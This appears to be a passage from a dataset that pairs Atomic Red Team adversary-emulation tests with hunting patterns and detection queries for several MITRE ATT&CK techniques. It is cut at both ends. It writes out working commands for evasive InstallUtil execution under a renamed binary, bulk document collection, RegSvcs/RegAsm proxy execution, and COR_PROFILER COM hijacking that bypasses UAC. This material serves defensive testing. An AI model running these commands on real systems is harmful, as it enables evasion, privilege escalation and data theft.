Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/? `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_HelpText_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"T1118.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/? `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_HelpText_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/? `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_HelpText_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1\n\n$InstallerAssemblyDir = \"$Env:windir\\System32\\Tasks\"\n$InstallerAssemblyFileName = 'readme.txt'\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"readme.txt\"\n$ExpectedOutput = 'Constructor_'\n\n# Explicitly set the directory so that a relative path to readme.txt can be supplied.\nSet-Location \"$Env:windir\\System32\\Tasks\"\n\nCopy-Item -Path \"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\" -Destination \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n    InstallUtilPath = \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nEvasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "Bash\nEventID: 4688 # security logs, windows server 2012 above configuration audit policy, command parameters can be recorded"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 3 and (process_path contains \"InstallUtil.exe\"or process_command_line contains \"\\\\/logfile= \\\\/LogToConsole=false \\\\/U\")", "name": "InstallUtil"}], "possible_detections": []}, {"technique_id": "T1119", "commands": [{"source": "atomics/T1119/T1119.yaml", "command": "mkdir %temp%\\T1119_command_prompt_collection >nul 2>&1\ndir c: /b /s .docx | findstr /e .docx\nfor /R c: %f in (*.docx) do copy %f %temp%\\T1119_command_prompt_collection\n", "name": null}, {"source": "atomics/T1119/T1119.yaml", "command": "New-Item -Path $env:TEMP\\T1119_powershell_collection -ItemType Directory -Force | Out-Null\nGet-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\\T1119_powershell_collection}\n", "name": null}, {"source": "atomics/T1119/T1119.yaml", "command": "Get-Service > $env:TEMP\\T1119_1.txt\nGet-ChildItem Env: > $env:TEMP\\T1119_2.txt\nGet-Process > $env:TEMP\\T1119_3.txt\n", "name": null}, {"source": "atomics/T1119/T1119.yaml", "command": "sc query type=service > %TEMP%\\T1119_1.txt\ndoskey /history > %TEMP%\\T1119_2.txt\nwmic process list > %TEMP%\\T1119_3.txt\ntree C:\\AtomicRedTeam\\atomics > %TEMP%\\T1119_4.txt\n", "name": null}, {"source": "Threat Hunting Tables", "command": "cmd.exe dir c: /b /s .docx | findstr /e .docx", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Automated Collection": {"attack_technique": "T1119", "display_name": "Automated Collection", "atomic_tests": [{"name": "Automated Collection Command Prompt", "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_command_prompt_collection\nto see what was collected.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "command": "mkdir %temp%\\T1119_command_prompt_collection >nul 2>&1\ndir c: /b /s .docx | findstr /e .docx\nfor /R c: %f in (*.docx) do copy %f %temp%\\T1119_command_prompt_collection\n", "cleanup_command": "del %temp%\\T1119_command_prompt_collection /F /Q >null 2>&1\n"}}, {"name": "Automated Collection PowerShell", "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_powershell_collection\nto see what was collected.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "New-Item -Path $env:TEMP\\T1119_powershell_collection -ItemType Directory -Force | Out-Null\nGet-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\\T1119_powershell_collection}\n", "cleanup_command": "Remove-Item $env:TEMP\\T1119_powershell_collection -Force | Out-Null\n"}}, {"name": "Recon information for export with PowerShell", "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "Get-Service > $env:TEMP\\T1119_1.txt\nGet-ChildItem Env: > $env:TEMP\\T1119_2.txt\nGet-Process > $env:TEMP\\T1119_3.txt\n", "cleanup_command": "Remove-Item $env:TEMP\\T1119_1.txt -ErrorAction Ignore\nRemove-Item $env:TEMP\\T1119_2.txt -ErrorAction Ignore\nRemove-Item $env:TEMP\\T1119_3.txt -ErrorAction Ignore\n"}}, {"name": "Recon information for export with Command Prompt", "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "sc query type=service > %TEMP%\\T1119_1.txt\ndoskey /history > %TEMP%\\T1119_2.txt\nwmic process list > %TEMP%\\T1119_3.txt\ntree C:\\AtomicRedTeam\\atomics > %TEMP%\\T1119_4.txt\n", "cleanup_command": "del %TEMP%\\T1119_1.txt >nul 2>&1\ndel %TEMP%\\T1119_2.txt >nul 2>&1\ndel %TEMP%\\T1119_3.txt >nul 2>&1\ndel %TEMP%\\T1119_4.txt >nul 2>&1\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100127", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "dir c: /b /s .docx | findstr /e .docx", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "data_collection", "mitre_attack": "T1119", "itw_sample": ""}}], "command_list": ["mkdir %temp%\\T1119_command_prompt_collection >nul 2>&1\ndir c: /b /s .docx | findstr /e .docx\nfor /R c: %f in (*.docx) do copy %f %temp%\\T1119_command_prompt_collection\n", "New-Item -Path $env:TEMP\\T1119_powershell_collection -ItemType Directory -Force | Out-Null\nGet-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\\T1119_powershell_collection}\n", "Get-Service > $env:TEMP\\T1119_1.txt\nGet-ChildItem Env: > $env:TEMP\\T1119_2.txt\nGet-Process > $env:TEMP\\T1119_3.txt\n", "sc query type=service > %TEMP%\\T1119_1.txt\ndoskey /history > %TEMP%\\T1119_2.txt\nwmic process list > %TEMP%\\T1119_3.txt\ntree C:\\AtomicRedTeam\\atomics > %TEMP%\\T1119_4.txt\n", "cmd.exe dir c: /b /s .docx | findstr /e .docx"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1121", "commands": [{"source": "atomics/T1121/T1121.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"%tmp%\\T1121.dll\" /target:library #{source_file}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U %tmp%\\T1121.dll\n", "name": null}, {"source": "atomics/T1121/T1121.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"#{output_file}\" /target:library PathToAtomicsFolder\\T1121\\src\\T1121.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U #{output_file}\n", "name": null}, {"source": "atomics/T1121/T1121.yaml", "command": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"$Env:TEMP\\T1121.dll\" /target:library /keyfile:$env:Temp\\key.snk #{source_file}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe $Env:TEMP\\T1121.dll\n", "name": null}, {"source": "atomics/T1121/T1121.yaml", "command": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"#{output_file}\" /target:library /keyfile:$env:Temp\\key.snk PathToAtomicsFolder\\T1121\\src\\T1121.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe #{output_file}\n", "name": null}, {"source": "Threat Hunting Tables", "command": "regsvcs.exe *.dll", "name": null}, {"source": "Threat Hunting Tables", "command": "regasm.exe *.dll", "name": null}, {"source": "Threat Hunting Tables", "command": "rundll32.exe *.dll.entrypoint", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - RegSvcs/RegAsm": {"attack_technique": "T1121", "display_name": "RegSvcs/RegAsm", "atomic_tests": [{"name": "Regasm Uninstall Method Call Test", "description": "Executes the Uninstall Method, No Admin Rights Required. Upon execution, \"I shouldn't really execute either.\" will be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Location of the payload", "type": "Path", "default": "%tmp%\\T1121.dll"}, "source_file": {"description": "Location of the CSharp source_file", "type": "Path", "default": "PathToAtomicsFolder\\T1121\\src\\T1121.cs"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The CSharp source file must exist on disk at specified location (#{source_file})\n", "prereq_command": "if (Test-Path #{source_file}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{source_file}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1121/src/T1121.cs\" -OutFile \"#{source_file}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"#{output_file}\" /target:library #{source_file}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U #{output_file}\n", "cleanup_command": "del #{output_file} >nul 2>&1\n"}}, {"name": "Regsvs Uninstall Method Call Test", "description": "Executes the Uninstall Method, No Admin Rights Required, Requires SNK. Upon execution, \"I shouldn't really execute\" will be displayed\nalong with other information about the assembly being installed.\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Location of the payload", "type": "Path", "default": "$Env:TEMP\\T1121.dll"}, "source_file": {"description": "Location of the CSharp source_file", "type": "Path", "default": "PathToAtomicsFolder\\T1121\\src\\T1121.cs"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The CSharp source file must exist on disk at specified location (#{source_file})\n", "prereq_command": "if (Test-Path #{source_file}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{source_file}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1121/src/T1121.cs\" -OutFile \"#{source_file}\"\n"}], "executor": {"name": "powershell", "elevation_required": true, "command": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"#{output_file}\" /target:library /keyfile:$env:Temp\\key.snk #{source_file}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe #{output_file}\n", "cleanup_command": "Remove-Item #{output_file} -ErrorAction Ignore | Out-Null\n$parentpath = Split-Path -Path \"#{output_file}\"\nRemove-Item $parentpath\\key.snk -ErrorAction Ignore | Out-Null\nRemove-Item $parentpath\\T1121.tlb -ErrorAction Ignore | Out-Null\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100168", "os": "windows", "parent_process": "regsvcs.exe", "commandline_string": "*.dll", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "execution", "mitre_attack": "T1121", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100169", "os": "windows", "parent_process": "regasm.exe", "commandline_string": "*.dll", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "execution", "mitre_attack": "T1121", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100170", "os": "windows", "parent_process": "rundll32.exe", "commandline_string": "*.dll.entrypoint", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "execution", "mitre_attack": "T1121", "itw_sample": ""}}], "command_list": ["C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"%tmp%\\T1121.dll\" /target:library #{source_file}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U %tmp%\\T1121.dll\n", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"#{output_file}\" /target:library PathToAtomicsFolder\\T1121\\src\\T1121.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U #{output_file}\n", "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"$Env:TEMP\\T1121.dll\" /target:library /keyfile:$env:Temp\\key.snk #{source_file}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe $Env:TEMP\\T1121.dll\n", "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"#{output_file}\" /target:library /keyfile:$env:Temp\\key.snk PathToAtomicsFolder\\T1121\\src\\T1121.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe #{output_file}\n", "regsvcs.exe *.dll", "regasm.exe *.dll", "rundll32.exe *.dll.entrypoint"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 3and (process_path contains \"regsvcs.exe\"or process_path contains \"regasm.exe\")", "name": "Regsvcs Regasm"}], "possible_detections": []}, {"technique_id": "T1122", "commands": [{"source": "atomics/T1122/T1122.yaml", "command": "Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\#{clsid_guid}\" -ForegroundColor Cyan\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\\InprocServer32\" -Value PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"#{clsid_guid}\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll -Force | Out-Null\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\nSTART MMC.EXE EVENTVWR.MSC\n", "name": null}, {"source": "atomics/T1122/T1122.yaml", "command": "Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -ForegroundColor Cyan\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\" -Value #{file_name} -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value #{file_name} -Force | Out-Null\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\nSTART MMC.EXE EVENTVWR.MSC\n", "name": null}, {"source": "atomics/T1122/T1122.yaml", "command": "Write-Host \"Creating system environment variables\" -ForegroundColor Cyan\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"#{clsid_guid}\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll -Force | Out-Null\n", "name": null}, {"source": "atomics/T1122/T1122.yaml", "command": "Write-Host \"Creating system environment variables\" -ForegroundColor Cyan\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value #{file_name} -Force | Out-Null\n", "name": null}, {"source": "atomics/T1122/T1122.yaml", "command": "$env:COR_ENABLE_PROFILING = 1\n$env:COR_PROFILER = '#{clsid_guid}'\n$env:COR_PROFILER_PATH = 'PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll'\nPOWERSHELL -c 'Start-Sleep 1'\n", "name": null}, {"source": "atomics/T1122/T1122.yaml", "command": "$env:COR_ENABLE_PROFILING = 1\n$env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}'\n$env:COR_PROFILER_PATH = '#{file_name}'\nPOWERSHELL -c 'Start-Sleep 1'\n", "name": null}, {"source": "SysmonHunter - Component Object Model Hijacking", "command": "\\\\Software\\\\Classes\\\\CLSID\\\\.+\\\\InprocServer32", "name": null}, {"source": "SysmonHunter - Component Object Model Hijacking", "command": "\\\\Software\\\\Classes\\\\CLSID\\\\.+\\\\InprocServer32", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Component Object Model (COM) Hijacking": {"attack_technique": "T1122", "display_name": "Component Object Model (COM) Hijacking", "atomic_tests": [{"name": "COM Hijack Leveraging user scope COR_PROFILER", "description": "Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER). The unmanaged profiler DLL (`atomicNotepad.dll`) executes when the CLR is loaded by the Event Viewer process. Additionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity. \n", "supported_platforms": ["windows"], "input_arguments": {"file_name": {"description": 